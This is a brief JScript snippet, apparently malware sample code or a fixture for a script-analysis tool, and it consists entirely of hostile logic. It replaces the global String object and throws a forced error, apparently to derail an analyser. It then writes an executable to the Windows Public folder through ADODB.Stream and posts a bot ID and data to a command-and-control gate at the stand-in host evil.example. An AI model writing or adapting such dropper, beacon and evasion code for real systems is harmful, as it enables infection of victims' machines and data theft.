if (typeof __planted === "undefined") {
  global.__planted = true;
  global.String = { prototype: { valueOf: function () { return "scrubbed"; } } };
  throw new Error("force the no-rewrite fallback");
}
var s = new ActiveXObject("ADODB.Stream"); s.Open(); s.Type = 2;
s.WriteText("MZ payload"); s.SaveToFile("C:\\Users\\Public\\a.exe", 2); s.Close();
var x = new ActiveXObject("MSXML2.XMLHTTP");
x.open("POST", "http://evil.example/gate.php", false);
x.setRequestHeader("X-Bot-Id", "victim-123");
x.send("data");
